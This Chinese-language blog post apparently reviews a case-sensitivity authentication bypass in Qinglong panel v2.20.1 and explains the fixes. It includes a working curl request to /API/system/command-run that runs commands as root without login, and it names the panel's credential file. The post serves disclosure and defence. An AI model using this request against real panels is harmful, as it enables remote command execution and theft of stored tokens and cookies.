---
title: "青龙面板 v2.20.1 鉴权绕过复盘：一个大写 /API/ 绕穿全局中间件"
date: 2026-02-28T16:45:00+08:00
draft: false
categories: ["漏洞分析"]
tags: ["青龙面板", "鉴权绕过", "Node.js", "Express", "漏洞复现"]
description: "复盘青龙面板 v2.20.1 的一处经典鉴权绕过（Issue #2934）：前置中间件用区分大小写的 startsWith('/api/') 做拦截，底下的 Express 路由却默认忽略大小写，改成 /API/ 直接跳过 JWT 校验打进后台接口。"
weight: 10
---

> 时效提醒：这是 2026 年 2 月底披露的历史漏洞（见 [GitHub Issue #2934](https://github.com/whyour/qinglong/issues/2934)），官方在后续版本镜像中早已修复。文中拉取旧版 `2.20.1` 容器仅作本地回环环境下的代码审计复盘。

青龙面板（`whyour/qinglong`）在 `2.20.1` 版本（更早的 `2.20.0` / `2.19.x` 分支若沿用同款中间件写法同样存在隐患）出过一个让人哭笑不得的未授权命令执行漏洞。整个绕过过程连复杂的编码变形都用不上，纯粹就是把请求路径里的 `/api/` 改成大写的 `/API/`，前门的 JWT 鉴权中间件当场失明，直接放请求进后台接口跑系统命令。

## 0x00 中间件认大小写，底下的路由却不认

翻一下当时 `back/loaders/express.ts` 里的全局鉴权中间件成因示意，一眼就能看出毛病出在哪：

```typescript
app.use((req, res, next) => {
    // 初衷：只要不是访问 /open/ 或 /api/，就当成前端静态页面直接放行
    if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
        return next();
    }

    const token = req.headers.authorization;
    if (!verifyToken(token)) {
        return res.status(401).json({ code: 401, message: '未授权访问' });
    }
    next();
});
```

JavaScript 字符串原生的 `startsWith()` 是严格区分大小写的，而 Express 框架底层的路由匹配偏偏默认不区分大小写（`case sensitive routing` 选项默认关闭，`/api/test`、`/API/test`、`/aPi/TeSt` 全都能命中同一条 `app.get('/api/test', ...)`）。

这就造出了一个极经典的解析差：当你把请求发往 `/API/system/command-run` 时，前置中间件拿 `'/API/...'` 去跟小写的 `'/api/'` 比前缀，得到 `false`，误以为你请求的是普通前端静态文件，直接 `return next()` 放过了 Token 校验；等请求一路往下走到 Express 路由表，路由层压根不挑大小写，痛痛快快把内置的系统命令执行处理器给调了起来。

更麻烦的是，这把钥匙捅开的不止一个接口，面板底下整排高危管理接口全跟着一块儿敞开了：

| 接口路径 | 原本用途 | 未授权打通后的后果 |
|---|---|---|
| `/api/system/command-run` | 执行系统命令 | 直接以容器运行身份执行任意命令 |
| `/api/envs` | 环境变量管理 | 读走面板里存的全部第三方 Cookie、机器人 Token 与密钥 |
| `/api/crons` / `/api/scripts` | 定时任务与脚本文件管理 | 直接篡改本地脚本内容或立即拉起任意任务 |
| `/api/subscriptions` | 拉取远程脚本仓库与订阅 | 往定时任务里塞恶意远程脚本仓库实现持久化 |
| `/api/user` | 面板账户管理 | 篡改管理员凭据或接管面板登录 |

## 0x01 本地起个 `2.20.1` 容器验证一眼

在本地绑死 `127.0.0.1` 回环地址起一个旧版 `2.20.1` 容器就能复现（切记千万别绑公网网卡）：

```bash
docker run -d \
  -p 127.0.0.1:5700:5700 \
  --name qinglong-vuln-lab \
  whyour/qinglong:2.20.1
```

等容器初始化跑完，先查一眼版本号，确认靶机是 `2.20.1`：

```bash
curl -s "http://127.0.0.1:5700/api/system/version"
# {"data":"2.20.1","code":200}
```

接着不带登录态按正常小写路径发一条 `PUT` 请求，会被鉴权中间件规规矩矩拦在门外：

```bash
curl -s -X PUT "http://127.0.0.1:5700/api/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "id"}'
# {"code":401,"message":"未授权访问"}
```

其他地方一个字不用动，单把路径里的 `/api/` 改成大写的 `/API/` 再发一次：

```bash
curl -s -X PUT "http://127.0.0.1:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "id"}'
# {"code":200,"data":"uid=0(root) gid=0(root) groups=0(root)"}
```

因为青龙容器内部默认就是 `root` 身份在跑，而且面板目录底下躺着存有登录摘要和令牌的 `/ql/data/config/auth.json` 以及满肚子的业务环境变量，当时凡是把 `5700` 端口裸露在公网上的旧版实例，一旦被扫到基本就是整机失守。验证完记得顺手 `docker rm -f qinglong-vuln-lab` 把靶机清掉。

## 0x02 代码层怎么修才不留死角

在 Express 里写全局鉴权中间件，要彻底堵死这类大小写与路径变形错位，最好两头一起收紧。

第一头是把鉴权中间件改成忽略大小写的正则匹配，或者干脆反转成"默认全部要求登录，只放行明确列出的登录接口与静态资源后缀"的白名单模式：

```typescript
const authPaths = [/^\/open\//i, /^\/api\//i];

app.use((req, res, next) => {
    if (!authPaths.some((pattern) => pattern.test(req.path))) {
        return next();
    }

    const token = req.headers.authorization;
    if (!verifyToken(token)) {
        return res.status(401).json({ code: 401, message: '未授权访问' });
    }
    next();
});
```

第二头是顺手把 Express 的大小写敏感路由开关显式打开：

```typescript
app.set('case sensitive routing', true);
```

这样前置中间件和底层路由表对路径的判断口径彻底一致，不会再出现"前门当静态资源放行、后门当 API 接单"的乌龙。

对平时自用青龙面板的玩家来说，第一件事肯定是直接 `docker pull whyour/qinglong:latest` 升到新版镜像，再去翻一眼 `/ql/log/system.log` 里有没有陌生 IP 留下的大写 `API` 请求痕迹。要是实在有老环境暂时动不了、想靠前面的 Nginx 先挡一刀，写规则时千万别手滑写成不区分大小写的 `if ($uri ~* ^/api/) { return 403; }`，那样会把正常的后台接口一块儿拍死；得用区分大小写的正则（比如 `if ($request_uri ~ "^/(?![a-z]+/)(?i:api|open)/")` 或干脆只放行全小写的 `/api/`）。当然最省心的规矩还是老生常谈：这种能直接跑定时脚本的面板别往公网敞，绑死 `127.0.0.1` 走 WireGuard 或 SSH 隧道连上去管，比啥 WAF 规则都管用。
